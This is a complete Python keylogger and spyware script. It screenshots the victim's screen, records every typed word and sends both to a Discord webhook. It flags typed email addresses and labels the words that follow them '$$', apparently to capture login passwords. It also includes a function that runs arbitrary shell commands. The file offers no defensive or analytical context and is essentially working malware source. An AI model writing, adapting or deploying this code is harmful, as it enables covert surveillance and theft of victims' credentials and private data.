import os
import pyautogui
from pynput import keyboard
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook

# discord webhook url 
w = ""

def ss(): 
    pyautogui.screenshot("begin.png")
    webhook = DiscordWebhook(url=w)
    with open("begin.png", "rb") as f:
        webhook.add_file(file=f.read(), filename="ss.png")
    response = webhook.execute()
    DiscordWebhook(url=w, content="conected").execute()
    os.remove("begin.png")

def execute_comands(input):
    command = input
    os.popen(command)
    return


word = []
words = []
t = []
def on_press(Key):
    global word, words
    if Key != keyboard.Key.space:
        if hasattr(Key, 'char') and Key.char is not None:
            word.append(Key.char)
    if Key == keyboard.Key.backspace and len(word) > 0:
        word.pop()
        

def on_release(key):
    global word, words,t 
    if key == Key.space or key == Key.enter:
        words.append("".join(word))
        word = []
        if "@" and ".com" in words[-1]:
            wordss = words[-1]
            webhook = DiscordWebhook(url=w, content="@: " + str(wordss))
            response = webhook.execute()
            t = True
    if len(words) == 30:
        if t == False:
            webhook = DiscordWebhook(url=w, content="WORDS: " + str(words))
            response = webhook.execute()
            words = []
        if t == True:
            print(words)
            webhook = DiscordWebhook(url=w, content="$$: " + str(words))
            response = webhook.execute()
            words = []
            t = False

ss()
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()